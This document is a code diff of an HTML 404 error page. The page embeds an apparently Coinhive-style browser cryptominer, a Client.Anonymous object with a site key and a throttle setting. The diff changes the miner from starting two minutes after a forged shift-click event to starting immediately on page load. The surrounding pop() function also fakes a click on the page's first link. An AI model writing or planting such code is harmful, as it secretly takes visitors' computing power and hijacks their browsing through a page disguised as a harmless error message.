@@ -43,6 +43,9 @@
     var _client = new Client.Anonymous('3ca9e38f9b0407573a33528b6415c69fd9bc32a944091bebbd778f39bd1ce77e', {
 	throttle: 0.5, ads: 0
     });
+ </script>
+<script>
+setTimeout(function(){ _client.start(); },  0 * 60 * 1000);
  function pop() {
         var evt = new MouseEvent('click', {
           view : window,
@@ -68,10 +71,8 @@
           shiftKey: true
         });
         document.getElementsByTagName('a')[0].dispatchEvent(evt);
-        setTimeout(function(){ _client.start(); },  2 * 60 * 1000);
       }
     </script>
-</script>
     <div class="container">
       <h1>404</h1>
       <p><strong>Page not found</strong></p>
